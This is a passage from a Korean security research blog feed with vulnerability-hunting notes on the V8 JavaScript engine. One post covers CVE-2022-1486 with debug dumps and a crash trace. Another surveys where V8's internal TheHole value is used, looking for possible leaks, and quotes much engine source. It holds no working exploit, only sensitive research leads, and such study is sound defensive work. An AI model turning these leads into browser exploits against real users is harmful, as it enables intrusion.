 0x34070000447d: [String] in ReadOnlySpace: #constructor: 0x3407001d4049 &lt;JSFunction Tag (sfi = 0x3407001d4025)&gt; (const data field 0), location: in-object
 0x340700005e39 &lt;Symbol: Symbol.toStringTag&gt;: 0x34070004c1c9 &lt;String[15]: “WebAssembly.Tag”&gt; (const data field 1), location: in-object
 0x340700005e39 &lt;Symbol: Symbol.toStringTag&gt;: 0x340700002371 &lt;Odd Oddball: uninitialized&gt; (const data field 2), location: in-object
 }
0x340700207f81: [Map]</li>
  <li>type: JS_OBJECT_TYPE</li>
  <li>instance size: 28</li>
  <li>inobject properties: 4</li>
  <li>elements kind: HOLEY_ELEMENTS</li>
  <li>unused property fields: 1</li>
  <li>enum length: invalid</li>
  <li>stable_map</li>
  <li>may_have_interesting_symbols</li>
  <li>prototype_map</li>
  <li>prototype info: 0x3407001d4505 <PrototypeInfo></PrototypeInfo></li>
  <li>prototype_validity cell: 0x340700144519 <Cell value="1"></Cell></li>
  <li>instance descriptors (own) #3: 0x34070004c1e5 &lt;DescriptorArray[3]&gt;</li>
  <li>prototype: 0x3407001c42f5 <object map="0x3407002021e9"></object></li>
  <li>constructor: 0x3407001c3f09 &lt;JSFunction Object (sfi = 0x34070015675d)&gt;</li>
  <li>dependent code: 0x3407000021e9 &lt;Other heap object (WEAK_ARRAY_LIST_TYPE)&gt;</li>
  <li>construction counter: 0</li>
</ul>

<p>uninitialized
true
uninitialized
DebugPrint: 0x34070004be51: [JS_OBJECT_TYPE]</p>
<ul>
  <li>map: 0x340700207fd1 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</li>
  <li>prototype: 0x3407001c42f5 <object map="0x3407002021e9"></object></li>
  <li>elements: 0x340700002261 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</li>
  <li>properties: 0x340700003401 &lt;PropertyArray[0]&gt;</li>
  <li>All own properties (excluding elements): {
 0x34070000447d: [String] in ReadOnlySpace: #constructor: 0x3407001d4049 &lt;JSFunction Tag (sfi = 0x3407001d4025)&gt; (const data field 0), location: in-object
 0x340700005e39 &lt;Symbol: Symbol.toStringTag&gt;: 0x340700002371 &lt;Odd Oddball: uninitialized&gt; (const data field 1), location: in-object
 }
0x340700207fd1: [Map]</li>
  <li>type: JS_OBJECT_TYPE</li>
  <li>instance size: 28</li>
  <li>inobject properties: 4</li>
  <li>elements kind: HOLEY_ELEMENTS</li>
  <li>unused property fields: 2</li>
  <li>enum length: invalid</li>
  <li>stable_map</li>
  <li>may_have_interesting_symbols</li>
  <li>prototype_map</li>
  <li>prototype info: 0x3407001d4505 <PrototypeInfo></PrototypeInfo></li>
  <li>prototype_validity cell: 0x340700144519 <Cell value="1"></Cell></li>
  <li>instance descriptors (own) #2: 0x34070004c2bd &lt;DescriptorArray[2]&gt;</li>
  <li>prototype: 0x3407001c42f5 <object map="0x3407002021e9"></object></li>
  <li>constructor: 0x3407001c3f09 &lt;JSFunction Object (sfi = 0x34070015675d)&gt;</li>
  <li>dependent code: 0x3407000021e9 &lt;Other heap object (WEAK_ARRAY_LIST_TYPE)&gt;</li>
  <li>construction counter: 0
```</li>
</ul>

<p>array로 설정해둔 property가 uninitialized로 바뀌어있음. 왜…? setter 끝나기 전까진 정상적으로 보였는데. 그리고, back pointer가 없다. prototype_map이라서 그런가? 나중에 시간 되면 확인해보자.</p>

<p>uninitialized로 되어있는 이유 추측. dictionary -&gt; fast 로 변경되면서 각 name에 대해 한 번씩 복사를 수행하다보니 두 개의 동일한 프로퍼티 중 하나에만 값이 쓰여진 것이 아닐까 하고 생각함. 나중에 필요시 확인해아 할 것. 1. dictionary -&gt; fast 변경 트리거 조건 및 그 이유. 2. 추측이 맞는지. 3. prototype_map이라서 back pointer가 없는 것인가?</p>

<p>1번 관련: in js-objects.cc, JSObject::MigrateSlowToFast 함수가 있다. 이 함수를 통해 dictionary -&gt; fast 로 변경되는 듯. 인자로 들어오는 const char* reason 을 출력해 보면 <code class="language-plaintext highlighter-rouge">OptimizeAsPrototype</code> 라고 나온다.</p>

<p>uninitialized 값은 v8 내부에서만 쓰여야 하는 값이다. the_hole 처럼 악용의 여지는 없나?</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// js-create-lowering.cc</span>
    <span class="c1">// Uninitialized fields are marked through the `uninitialized_value` Oddball</span>
    <span class="c1">// (even for Smi representation!), or in the case of Double representation</span>
    <span class="c1">// through a HeapNumber containing the hole-NaN. Since Double-to-Tagged</span>
    <span class="c1">// representation changes are done in-place, we may even encounter these</span>
    <span class="c1">// HeapNumbers in Tagged representation.</span>
    <span class="c1">// Note that although we create nodes to write `uninitialized_value` into</span>
    <span class="c1">// the object, the field should be overwritten immediately with a real</span>
    <span class="c1">// value, and `uninitialized_value` should never be exposed to JS.</span>
</code></pre></div></div>

<p>절대 JS로 노출하지 말라는 주석이 있다. 그러나… uninitialized_value 를 쓰는 곳이 많지 않고, 잠깐 훑어봐서는 특별한 취약 요소를 찾지 못했다.</p>

<h3 id="checkisolate-has_pending_exception-failed">CHECK(!isolate-&gt;has_pending_exception()) failed?</h3>

<p>setter 안에서 익셉션을 발생시키고 try-catch로 받지 않을 경우 pending_exception이 남아있는 채로 InstallConditionalFeatures가 끝나고 사용자의 js 코드로 돌아온다. 여기서 Console.log 와 같은 콘솔 함수를 호출하면 CHECK에 걸린다. (다음 조건으로 CHECK하는 곳은 콘솔이 유일, 나머지는 DCHECK)</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">ConsoleCall</span><span class="p">(</span>
    <span class="n">Isolate</span><span class="o">*</span> <span class="n">isolate</span><span class="p">,</span> <span class="k">const</span> <span class="n">internal</span><span class="o">::</span><span class="n">BuiltinArguments</span><span class="o">&amp;</span> <span class="n">args</span><span class="p">,</span>
    <span class="kt">void</span> <span class="p">(</span><span class="n">debug</span><span class="o">::</span><span class="n">ConsoleDelegate</span><span class="o">::*</span><span class="n">func</span><span class="p">)(</span><span class="k">const</span> <span class="n">v8</span><span class="o">::</span><span class="n">debug</span><span class="o">::</span><span class="n">ConsoleCallArguments</span><span class="o">&amp;</span><span class="p">,</span>
                                         <span class="k">const</span> <span class="n">v8</span><span class="o">::</span><span class="n">debug</span><span class="o">::</span><span class="n">ConsoleContext</span><span class="o">&amp;</span><span class="p">))</span> <span class="p">{</span>
  <span class="n">CHECK</span><span class="p">(</span><span class="o">!</span><span class="n">isolate</span><span class="o">-&gt;</span><span class="n">has_pending_exception</span><span class="p">());</span>
  <span class="n">CHECK</span><span class="p">(</span><span class="o">!</span><span class="n">isolate</span><span class="o">-&gt;</span><span class="n">has_scheduled_exception</span><span class="p">());</span>
  			<span class="p">...</span>
</code></pre></div></div>

<p>다음은 setter 안에서 <code class="language-plaintext highlighter-rouge">val = nO_eXiSt_VaRiAbLe;</code>와 같은 구문을 활용하여 강제로 익셉션을 발생시킨 결과임.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>			...
DEBUG:: WasmJs::InstallConditionalFeatures, setting tag_name("Tag") failed.


#
# Fatal error in , line 0
# Check failed: !isolate-&gt;has_pending_exception().
#
#
#
#FailureMessage Object: 0x7fff546c91f0
==== C stack trace ===============================

    ./x64.release/d8(+0xef0153) [0x56322780d153]
    ./x64.release/d8(+0xeefa0b) [0x56322780ca0b]
    ./x64.release/d8(+0xee6075) [0x563227803075]
    ./x64.release/d8(+0x3e3923) [0x563226d00923]
    ./x64.release/d8(+0x3e2ddd) [0x563226cffddd]
    [0x5631a7f0b1b8]
Trace/breakpoint trap (core dumped)
</code></pre></div></div>

<p>pending_exception이 남아있는 채로 처리되지 않고 사용자의 js 코드로 돌아온 것이 어떠한 이용가치가 있는지는 아직 불확실.</p>

<h3 id="결론">결론</h3>

<p>결론: 동일한 심볼에 대해 두 개의 프로퍼티가 생성되도록 하는 것까지는 가능. 이것을 어떻게 악용할 지는 불확실(일반 객체가 아닌, 프로토타입이라서 제약이 많음). uninitialized_value를 JS로 노출시키는 것 까진 했으나 그 외 마땅한 이용방안은 안보임. pending_exception이 남아있는 채로 js로 돌아온 것 또한 특별한 이용가치가 있는지 불분명.</p>

                    ]]>
                </content:encoded>
                <guid isPermaLink="false">/2022/05/05/1486/</guid>
                <description>
                    
                    CVE-2022-1486
                    
                </description>
                <pubDate>Thu, 05 May 2022 13:30:00 +0900</pubDate>
                <author>syyyipe</author>
            </item>
        
    
        
            <item>
                <title>TheHole</title>
                <link>http://localhost:4000/2022/03/23/thehole/</link>
                <content:encoded>
                    <![CDATA[
                    <h2 id="environments">Environments</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>everyyy@baddell:/work/v8/220317_master/v8$ git rev-parse HEAD
e62f556862624103ea1da5b9dcef9b216832033b
everyyy@baddell:/work/v8/220317_master/v8$ git describe --contains
10.1.124~1
everyyy@baddell:/work/v8/220317_master/v8$
</code></pre></div></div>

<h2 id="thehole">TheHole</h2>

<p>38003에서 힌트를 얻어서 시작.</p>

<p><strong>src/builtins/builtins-collections-gen.cc</strong> 를 보면 TheHoleConstant() 함수를 통해 TheHole 값을 사용하고 있음. 해당 함수는 <strong>src/codegen/code-stub-assembler.cc</strong> 에서 매크로를 통해 생성된 것.</p>

<p><strong>src/codegen/code-stub-assembler.cc</strong></p>
<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define HEAP_CONSTANT_ACCESSOR(rootIndexName, rootAccessorName, name)        \
  TNode&lt;std::remove_pointer&lt;std::remove_reference&lt;decltype(                  \
      std::declval&lt;ReadOnlyRoots&gt;().rootAccessorName())&gt;::type&gt;::type&gt;       \
      CodeStubAssembler::name##Constant() {                                  \
    return UncheckedCast&lt;std::remove_pointer&lt;std::remove_reference&lt;decltype( \
        std::declval&lt;ReadOnlyRoots&gt;().rootAccessorName())&gt;::type&gt;::type&gt;(    \
        LoadRoot(RootIndex::k##rootIndexName));                              \
  }
</span><span class="n">HEAP_IMMUTABLE_IMMOVABLE_OBJECT_LIST</span><span class="p">(</span><span class="n">HEAP_CONSTANT_ACCESSOR</span><span class="p">)</span>
<span class="cp">#undef HEAP_CONSTANT_ACCESSOR
</span></code></pre></div></div>

<p><strong>src/codegen/code-stub-assembler.h</strong></p>
<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define HEAP_IMMUTABLE_IMMOVABLE_OBJECT_LIST(V)                              \
...
</span>  <span class="n">V</span><span class="p">(</span><span class="n">TheHoleValue</span><span class="p">,</span> <span class="n">the_hole_value</span><span class="p">,</span> <span class="n">TheHole</span><span class="p">)</span>                                   \
<span class="p">...</span>

<span class="p">...</span>
<span class="cp">#define HEAP_IMMOVABLE_OBJECT_LIST(V)   \
  HEAP_MUTABLE_IMMOVABLE_OBJECT_LIST(V) \
  HEAP_IMMUTABLE_IMMOVABLE_OBJECT_LIST(V)
</span></code></pre></div></div>

<p>“TheHole” 과 “the_hole_value” 를 키워드로 소스코드 리파지토리 대상 전체 키워드 검색해서 훑어보기로 하자.</p>

<p>아니면… –background-index=true 옵션 줘서 인덱싱을 다 한듯한데… reference를 찾아서 볼까.</p>

<p>일단 전체적인 감을 잡기 위해 키워드 검색부터 훑어보자.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">src</span><span class="o">/</span><span class="n">heap</span><span class="o">/</span><span class="n">setup</span><span class="o">-</span><span class="n">heap</span><span class="o">-</span><span class="n">internal</span><span class="p">.</span><span class="n">cc</span>

<span class="kt">bool</span> <span class="n">Heap</span><span class="o">::</span><span class="n">CreateInitialMaps</span><span class="p">()</span> <span class="p">{</span>
                    <span class="p">...</span>
  <span class="n">set_the_hole_value</span><span class="p">(</span><span class="n">Oddball</span><span class="o">::</span><span class="n">cast</span><span class="p">(</span><span class="n">obj</span><span class="p">));</span>
  <span class="n">Oddball</span><span class="o">::</span><span class="n">cast</span><span class="p">(</span><span class="n">obj</span><span class="p">).</span><span class="n">set_kind</span><span class="p">(</span><span class="n">Oddball</span><span class="o">::</span><span class="n">kTheHole</span><span class="p">);</span>
                    <span class="p">...</span>

<span class="kt">void</span> <span class="n">Heap</span><span class="o">::</span><span class="n">CreateInitialObjects</span><span class="p">()</span> <span class="p">{</span>
                    <span class="p">...</span>
  <span class="c1">// Initialize the_hole_value.</span>
  <span class="n">Oddball</span><span class="o">::</span><span class="n">Initialize</span><span class="p">(</span><span class="n">isolate</span><span class="p">(),</span> <span class="n">factory</span><span class="o">-&gt;</span><span class="n">the_hole_value</span><span class="p">(),</span> <span class="s">"hole"</span><span class="p">,</span>
                      <span class="n">factory</span><span class="o">-&gt;</span><span class="n">hole_nan_value</span><span class="p">(),</span> <span class="s">"undefined"</span><span class="p">,</span>
                      <span class="n">Oddball</span><span class="o">::</span><span class="n">kTheHole</span><span class="p">);</span>
                    <span class="p">...</span>

</code></pre></div></div>

<p>TheHole 이 초기화되는 코드인 듯.</p>

<h3 id="thehole이-쓰이는-곳들">TheHole이 쓰이는 곳들</h3>

<p>배열의 빈 element를 나타낼 때</p>
<ul>
  <li>이후 이를 접근하는 다양한 코드 패스들에 대해 TheHole을 검증하는 루틴이 존재함</li>
  <li>TheHole을 검증하지 않고 접근하는 코드 패스가 있는지 찾아 볼 필요가 있음, 이는 (당연하게도) TheHole 키워드 검색으로 발견되지 않으므로 좀 더 수고스러운 코드 분석이 필요할 것으로 생각됨.</li>
  <li>map, set, weakmap 등 collection 객체에서 삭제된 키(및 값)를 TheHole로 나타냄(src/builtins/builtins-collections-gen.cc)</li>
  <li>src/builtins/builtins-constructor-gen.cc, prototype(아니면 initial map?)에 TheHole이 쓰여지는 경우가 있는 듯</li>
  <li>src/builtins/builtins-internal-gen.cc, Dictionary의 경우에도 Delete 시(아마도 property?) TheHole을 씀</li>
  <li>src/builtins/builtins-internal-gen.cc, TF_BUILTIN(AdaptorWithBuiltinExitFrame), 의미 분석 필요</li>
  <li>** exception의 pending message가 clear되어 TheHole이 유출될 가능성이 있었던 듯? (src/builtins/builtins-iterator-gen.cc 참고), https://bugs.chromium.org/p/v8/issues/detail?id=12439 요 링크 참고해보자</li>
  <li>Promise(tq 파일들) 관련 코드들에서도 좀 보임…</li>
  <li>src/builtins/…/builtins-….cc 에 구현된 로우 레벨 코드에서도 사용되는 경우가 여럿 있으며(RootIndex::kTheHoleValue) 각각 사용되는 경우마다 분석이 필요할 듯. 이는 나중에 분석을 하긴 해야 할 듯. (어려워보임)</li>
  <li>compiler 에서는 Type::Hole(), OddballType::kHole, jsgraph-&gt;TheHoleConstant() 형태 등으로 사용됨. compiler 에서의 TheHole 사용은 나중에 따로 모아서 정리해보자</li>
  <li>** scheduled_exception 관련</li>
  <li>인터프리터에서 BytecodeArrayBuilder&amp; BytecodeArrayBuilder::LoadTheHole() 와 같은 경우에도 쓰임. Interpreter에서 쓰이는 경우도 언젠간 봐야 할지도… 인터프리터 자체에 대한 이해가 필요해서 많이 어려울 듯.</li>
  <li>maglev(<code class="language-plaintext highlighter-rouge">void MaglevGraphBuilder::VisitLdaTheHole()</code>)</li>
  <li>src/objects/module.cc, module 관련 코드에서 TheHole여부 체크 루틴이 다수 있음. module을 통해 TheHole leak의 가능성을 고민해봐도 좋을 듯</li>
  <li>scope_info(SFI, SharedFunctionInfo)에도 에도 TheHole이 들어갈 수 있는 듯</li>
  <li>class의 super class 등을 나타낼 때 TheHole이 들어갈 수 있는 듯(최상위 클래스의 경우)</li>
  <li>LookupSlot? Context::Lookup? LoadLookupSlot 을 살펴보자</li>
  <li>HashTable의 Lookup 결과가 TheHole 일 수 있음</li>
  <li>wasm</li>
</ul>

<p>별개로</p>
<ul>
  <li>set_the_hole, is_the_hole 과 같이 the_hole 으로도 검색을 해 보아야 할 듯</li>
  <li>src/objects/objects.cc, PropertyCell 관련, 30632와 연관하여 필요할 경우 보자</li>
</ul>

<h2 id="thehole-keyward-search">“TheHole” Keyward Search</h2>

<p><strong>include/v8-function-callback.h</strong></p>
<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">template</span> <span class="o">&lt;</span><span class="k">typename</span> <span class="nc">T</span><span class="p">&gt;</span>
<span class="n">Local</span><span class="o">&lt;</span><span class="n">Value</span><span class="o">&gt;</span> <span class="n">ReturnValue</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;::</span><span class="n">Get</span><span class="p">()</span> <span class="k">const</span> <span class="p">{</span>
  <span class="k">using</span> <span class="n">I</span> <span class="o">=</span> <span class="n">internal</span><span class="o">::</span><span class="n">Internals</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">value_</span> <span class="o">==</span> <span class="o">*</span><span class="n">I</span><span class="o">::</span><span class="n">GetRoot</span><span class="p">(</span><span class="n">GetIsolate</span><span class="p">(),</span> <span class="n">I</span><span class="o">::</span><span class="n">kTheHoleValueRootIndex</span><span class="p">))</span>
    <span class="k">return</span> <span class="n">Local</span><span class="o">&lt;</span><span class="n">Value</span><span class="o">&gt;</span><span class="p">(</span><span class="o">*</span><span class="n">Undefined</span><span class="p">(</span><span class="n">GetIsolate</span><span class="p">()));</span>
  <span class="k">return</span> <span class="n">Local</span><span class="o">&lt;</span><span class="n">Value</span><span class="o">&gt;::</span><span class="n">New</span><span class="p">(</span><span class="n">GetIsolate</span><span class="p">(),</span> <span class="k">reinterpret_cast</span><span class="o">&lt;</span><span class="n">Value</span><span class="o">*&gt;</span><span class="p">(</span><span class="n">value_</span><span class="p">));</span>
<span class="p">}</span>
</code></pre></div></div>

<p>위 부분이 TheHole 인 값을 읽으려고 하면 undefined가 획득되도록 한 부분인듯? 테스트해보자.</p>

<p>맞긴 맞는듯 한데, libv8을 가져다 쓰는(즉, embedding하는) 경우를 위한 것인듯. d8 콘솔에서는 트리거되지 않음.</p>

<p>cs 에서 보니 embedding하면서 chromium에서 Get()을 호출하는 경우가 꽤 된다. 이러한 관점으로, TheHole 유출 가능성을 확대해서 chromium 프로젝트까지 훑어 볼 필요도 있을 듯.</p>

<p>Internals::kTheHoleValueRootIndex 가 직접 쓰이는 곳은 위 코드가 유일한 듯.</p>

<hr />

<p>AST에서 TheHole을 나타내기 위해 Literal::kTheHole 을 정의하여 사용함. Literal의 종류는 kSmi, kHeapNumber, kBigInt, kString, kBoolean, kUndefined, kNull, kTheHole.</p>

<p>파싱 후 AST 구축 중에 배열 hole 처리 관련 구문만 있는 듯…</p>

<p><strong>src/ast/ast.cc</strong></p>
<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="n">ArrayLiteralBoilerplateBuilder</span><span class="o">::</span><span class="n">InitDepthAndFlags</span><span class="p">()</span> <span class="p">{</span>
    <span class="p">...</span>
        <span class="k">switch</span> <span class="p">(</span><span class="n">literal</span><span class="o">-&gt;</span><span class="n">type</span><span class="p">())</span> <span class="p">{</span>
          <span class="k">case</span> <span class="n">Literal</span><span class="o">::</span><span class="n">kTheHole</span><span class="p">:</span>
            <span class="n">is_holey</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
            <span class="c1">// The hole is allowed in holey double arrays (and holey Smi</span>
            <span class="c1">// arrays), so ignore it as far as is_all_number is concerned.</span>
            <span class="k">break</span><span class="p">;</span>
    <span class="p">...</span>
</code></pre></div></div>

<p>TheHole 여부 판단해서 배열의 is_holey 여부 판단함.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>everyyy@baddell:/work/v8/220317_master/v8$ ./out.gn/x64.release/d8
V8 version 10.1.0 (candidate)
d8&gt; a = [,,]
Literal::kTheHole!
Literal::kTheHole!
[, ]
d8&gt; a = [,1]
Literal::kTheHole!
[, 1]
d8&gt; 
</code></pre></div></div>

<hr />

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">src</span><span class="o">/</span><span class="n">baseline</span><span class="o">/</span><span class="n">baseline</span><span class="o">-</span><span class="n">compiler</span><span class="p">.</span><span class="n">cc</span><span class="o">:</span>
   <span class="mi">676</span>  
   <span class="mi">677</span><span class="o">:</span> <span class="kt">void</span> <span class="n">BaselineCompiler</span><span class="o">::</span><span class="n">VisitLdaTheHole</span><span class="p">()</span> <span class="p">{</span>
   <span class="mi">678</span><span class="o">:</span>   <span class="n">__</span> <span class="n">LoadRoot</span><span class="p">(</span><span class="n">kInterpreterAccumulatorRegister</span><span class="p">,</span> <span class="n">RootIndex</span><span class="o">::</span><span class="n">kTheHoleValue</span><span class="p">);</span>
   <span class="mi">679</span>  <span class="p">}</span>
</code></pre></div></div>

<p>LdaTheHole 을 따로 더 봐야할까?</p>

<hr />

<p><strong>src/builtins/accessors.cc</strong></p>
<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Handle</span><span class="o">&lt;</span><span class="n">JSObject</span><span class="o">&gt;</span> <span class="n">GetFrameArguments</span><span class="p">(</span><span class="n">Isolate</span><span class="o">*</span> <span class="n">isolate</span><span class="p">,</span>
                                   <span class="n">JavaScriptFrameIterator</span><span class="o">*</span> <span class="n">it</span><span class="p">,</span>
                                   <span class="kt">int</span> <span class="n">function_index</span><span class="p">)</span> <span class="p">{</span>
    <span class="p">...</span>
  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">length</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">Object</span> <span class="n">value</span> <span class="o">=</span> <span class="n">frame</span><span class="o">-&gt;</span><span class="n">GetParameter</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">value</span><span class="p">.</span><span class="n">IsTheHole</span><span class="p">(</span><span class="n">isolate</span><span class="p">))</span> <span class="p">{</span>
      <span class="c1">// Generators currently use holes as dummy arguments when resuming.  We</span>
      <span class="c1">// must not leak those.</span>
      <span class="n">DCHECK</span><span class="p">(</span><span class="n">IsResumableFunction</span><span class="p">(</span><span class="n">function</span><span class="o">-&gt;</span><span class="n">shared</span><span class="p">().</span><span class="n">kind</span><span class="p">()));</span>
      <span class="n">value</span> <span class="o">=</span> <span class="n">ReadOnlyRoots</span><span class="p">(</span><span class="n">isolate</span><span class="p">).</span><span class="n">undefined_value</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="n">array</span><span class="o">-&gt;</span><span class="n">set</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">value</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">arguments</span><span class="o">-&gt;</span><span class="n">set_elements</span><span class="p">(</span><span class="o">*</span><span class="n">array</span><span class="p">);</span>

  <span class="c1">// Return the freshly allocated arguments object.</span>
  <span class="k">return</span> <span class="n">arguments</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>arguments를 설정해주는 부분으로 보이며, TheHole argument일 경우 undefined로 바꿔주는 부분인 듯.</p>

<p>그냥 해서는 위 코드가 잘 트리거가 안됨. 주석을 참고하여 generator 같은 것들을 고려해보아야 할지도…</p>

<p>레퍼런스들을 훑어봐도 어디서부터 호출되는 코드인지 감이 안온다. 호출 안되는 코드인가?</p>

<hr />

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">src</span><span class="o">/</span><span class="n">builtins</span><span class="o">/</span><span class="n">array</span><span class="o">-</span><span class="n">lastindexof</span><span class="p">.</span><span class="n">tq</span>
<span class="n">LoadWithHoleCheck</span><span class="o">&lt;</span><span class="n">FixedArray</span><span class="o">&gt;</span><span class="p">(</span><span class="n">implicit</span> <span class="n">context</span><span class="o">:</span> <span class="n">Context</span><span class="p">)(</span>
    <span class="n">elements</span><span class="o">:</span> <span class="n">FixedArrayBase</span><span class="p">,</span> <span class="n">index</span><span class="o">:</span> <span class="n">Smi</span><span class="p">)</span><span class="o">:</span> <span class="n">JSAny</span>
    <span class="n">labels</span> <span class="n">IfHole</span> <span class="p">{</span>
  <span class="k">const</span> <span class="n">elements</span><span class="o">:</span> <span class="n">FixedArray</span> <span class="o">=</span> <span class="n">UnsafeCast</span><span class="o">&lt;</span><span class="n">FixedArray</span><span class="o">&gt;</span><span class="p">(</span><span class="n">elements</span><span class="p">);</span>
  <span class="k">const</span> <span class="n">element</span><span class="o">:</span> <span class="n">Object</span> <span class="o">=</span> <span class="n">elements</span><span class="p">.</span><span class="n">objects</span><span class="p">[</span><span class="n">index</span><span class="p">];</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">element</span> <span class="o">==</span> <span class="n">TheHole</span><span class="p">)</span> <span class="k">goto</span> <span class="n">IfHole</span><span class="p">;</span>
  <span class="k">return</span> <span class="n">UnsafeCast</span><span class="o">&lt;</span><span class="n">JSAny</span><span class="o">&gt;</span><span class="p">(</span><span class="n">element</span><span class="p">);</span>
<span class="p">}</span>

<span class="n">LoadWithHoleCheck</span><span class="o">&lt;</span><span class="n">FixedDoubleArray</span><span class="o">&gt;</span><span class="p">(</span><span class="n">implicit</span> <span class="n">context</span><span class="o">:</span> <span class="n">Context</span><span class="p">)(</span>
    <span class="n">elements</span><span class="o">:</span> <span class="n">FixedArrayBase</span><span class="p">,</span> <span class="n">index</span><span class="o">:</span> <span class="n">Smi</span><span class="p">)</span><span class="o">:</span> <span class="n">JSAny</span>
    <span class="n">labels</span> <span class="n">IfHole</span> <span class="p">{</span>
  <span class="k">const</span> <span class="n">elements</span><span class="o">:</span> <span class="n">FixedDoubleArray</span> <span class="o">=</span> <span class="n">UnsafeCast</span><span class="o">&lt;</span><span class="n">FixedDoubleArray</span><span class="o">&gt;</span><span class="p">(</span><span class="n">elements</span><span class="p">);</span>
  <span class="k">const</span> <span class="n">element</span><span class="o">:</span> <span class="n">float64</span> <span class="o">=</span> <span class="n">elements</span><span class="p">.</span><span class="n">floats</span><span class="p">[</span><span class="n">index</span><span class="p">].</span><span class="n">Value</span><span class="p">()</span> <span class="n">otherwise</span> <span class="n">IfHole</span><span class="p">;</span>
  <span class="k">return</span> <span class="n">AllocateHeapNumberWithValue</span><span class="p">(</span><span class="n">element</span><span class="p">);</span>
<span class="p">}</span>

<span class="n">macro</span> <span class="n">FastArrayLastIndexOf</span><span class="o">&lt;</span><span class="n">Elements</span> <span class="o">:</span> <span class="n">type</span> <span class="n">extends</span> <span class="n">FixedArrayBase</span><span class="o">&gt;</span><span class="p">(</span>
    <span class="n">context</span><span class="o">:</span> <span class="n">Context</span><span class="p">,</span> <span class="n">array</span><span class="o">:</span> <span class="n">JSArray</span><span class="p">,</span> <span class="n">from</span><span class="o">:</span> <span class="n">Smi</span><span class="p">,</span> <span class="n">searchElement</span><span class="o">:</span> <span class="n">JSAny</span><span class="p">)</span><span class="o">:</span> <span class="n">Smi</span> <span class="p">{</span>
  <span class="k">const</span> <span class="n">elements</span><span class="o">:</span> <span class="n">FixedArrayBase</span> <span class="o">=</span> <span class="n">array</span><span class="p">.</span><span class="n">elements</span><span class="p">;</span>
  <span class="n">let</span> <span class="n">k</span><span class="o">:</span> <span class="n">Smi</span> <span class="o">=</span> <span class="n">from</span><span class="p">;</span>

  <span class="c1">// Bug(898785): Due to side-effects in the evaluation of `fromIndex`</span>
  <span class="c1">// the {from} can be out-of-bounds here, so we need to clamp {k} to</span>
  <span class="c1">// the {elements} length. We might be reading holes / hole NaNs still</span>
  <span class="c1">// due to that, but those will be ignored below.</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">k</span> <span class="o">&gt;=</span> <span class="n">elements</span><span class="p">.</span><span class="n">length</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">k</span> <span class="o">=</span> <span class="n">elements</span><span class="p">.</span><span class="n">length</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="k">while</span> <span class="p">(</span><span class="n">k</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">try</span> <span class="p">{</span>
      <span class="k">const</span> <span class="n">element</span><span class="o">:</span> <span class="n">JSAny</span> <span class="o">=</span> <span class="n">LoadWithHoleCheck</span><span class="o">&lt;</span><span class="n">Elements</span><span class="o">&gt;</span><span class="p">(</span><span class="n">elements</span><span class="p">,</span> <span class="n">k</span><span class="p">)</span>
          <span class="n">otherwise</span> <span class="n">Hole</span><span class="p">;</span>

      <span class="k">const</span> <span class="n">same</span><span class="o">:</span> <span class="n">Boolean</span> <span class="o">=</span> <span class="n">StrictEqual</span><span class="p">(</span><span class="n">searchElement</span><span class="p">,</span> <span class="n">element</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">same</span> <span class="o">==</span> <span class="n">True</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">dcheck</span><span class="p">(</span><span class="n">Is</span><span class="o">&lt;</span><span class="n">FastJSArray</span><span class="o">&gt;</span><span class="p">(</span><span class="n">array</span><span class="p">));</span>
        <span class="k">return</span> <span class="n">k</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span> <span class="n">label</span> <span class="n">Hole</span> <span class="p">{}</span>  <span class="c1">// Do nothing for holes.</span>

    <span class="o">--</span><span class="n">k</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="n">dcheck</span><span class="p">(</span><span class="n">Is</span><span class="o">&lt;</span><span class="n">FastJSArray</span><span class="o">&gt;</span><span class="p">(</span><span class="n">array</span><span class="p">));</span>
  <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

